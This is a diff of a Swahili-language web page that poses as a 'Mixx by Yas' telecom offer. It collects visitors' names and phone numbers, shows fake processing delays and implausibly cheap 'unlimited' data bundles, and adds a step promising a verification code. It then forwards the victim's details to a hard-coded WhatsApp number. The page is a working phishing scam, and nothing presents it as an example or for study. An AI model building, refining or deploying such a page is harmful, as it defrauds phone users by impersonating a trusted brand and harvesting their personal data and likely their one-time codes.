@@ -1,55 +1,9 @@
-<!DOCTYPE html>
-<html lang="sw">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mixx by Yas</title>
-
-<style>
-body {margin:0;font-family:Arial;}
-.hero {
-  height:100vh;
-  background:url('poster.jpg') no-repeat center center/cover;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-}
-.overlay {
-  background:rgba(0,0,0,0.7);
-  padding:25px;
-  border-radius:12px;
-  text-align:center;
-  color:white;
-  width:90%;
-  max-width:350px;
-}
-input, button {
-  width:100%;
-  padding:12px;
-  margin-top:10px;
-  border-radius:8px;
-  border:none;
-}
-button {
-  background:yellow;
-  font-weight:bold;
-}
-.option {
-  background:#111;
-  margin-top:10px;
-  padding:10px;
-  border-radius:8px;
-  cursor:pointer;
-}
-</style>
-</head>
-
 <body>
 
 <div class="hero">
   <div class="overlay" id="app">
 
-    <h1>Jiunge na Ofa</h1>
+    <h2>Huduma ya Haraka ya Mixx</h2>
 
     <input type="text" id="name" placeholder="Majina kamili">
     <input type="number" id="phone" placeholder="Namba yako">
@@ -66,58 +20,74 @@ let userName = "";
 let userPhone = "";
 let selectedPackage = "";
 
+// STEP 1
 function step1(){
   userName = document.getElementById("name").value;
   userPhone = document.getElementById("phone").value;
 
   if(userName=="" || userPhone==""){
-    document.getElementById("status").innerHTML="⚠️ Jaza taarifa zote";
+    document.getElementById("status").innerHTML="⚠️ Jaza taarifa zako zote";
     return;
   }
 
-  document.getElementById("app").innerHTML = "<p>⏳ Inachakata taarifa...</p>";
+  document.getElementById("app").innerHTML =
+  "<p>⏳ Inachakata taarifa zako...</p>";
 
   setTimeout(step2,2000);
 }
 
+// STEP 2
 function step2(){
   document.getElementById("app").innerHTML = `
   <h3>Chagua Kifurushi</h3>
 
   <div class="option" onclick="selectPackage('75GB - 3570')">
-  1. 75GB kwa Tsh 3,570 BILA KIKOMO
+  75GB kwa Tsh 3,570 BILA KIKOMO
   </div>
 
   <div class="option" onclick="selectPackage('100GB - 5999')">
-  2. 100GB kwa Tsh 5,999 BILA KIKOMO
+  100GB kwa Tsh 5,999 BILA KIKOMO
   </div>
   `;
 }
 
+// STEP 3
 function selectPackage(pkg){
   selectedPackage = pkg;
 
-  document.getElementById("app").innerHTML = "<p>⏳ Inachakata chaguo lako...</p>";
+  document.getElementById("app").innerHTML =
+  "<p>⏳ Inachakata chaguo lako...</p>";
 
   setTimeout(step3,2000);
 }
 
+// STEP 4
 function step3(){
   document.getElementById("app").innerHTML = `
-  <p>🔐 Thibitisha namba yako kuendelea</p>
-  <button onclick="finish()">THIBITISHA</button>
+  <p>🔐 Thibitisha ili kuendelea</p>
+  <button onclick="step4()">THIBITISHA</button>
   `;
 }
 
+// STEP 5
+function step4(){
+  document.getElementById("app").innerHTML =
+  "<p>📩 Endelea ili uweze kupokea Msimbo wa uthibitisho na menu ya kupokea vifurushi...</p>";
+
+  setTimeout(finish,2500);
+}
+
+// FINAL STEP
 function finish(){
-  let message = "Mteja Mpya%0A"
+
+  let message = "MTEJA MPYA%0A"
   + "Jina: " + userName + "%0A"
   + "Namba: " + userPhone + "%0A"
   + "Kifurushi: " + selectedPackage;
 
-  window.location.href = "https://wa.me/255780467038?text=" + message;
+  window.location.href =
+  "https://wa.me/255780467038?text=" + message;
 }
 </script>
 
 </body>
-</html>
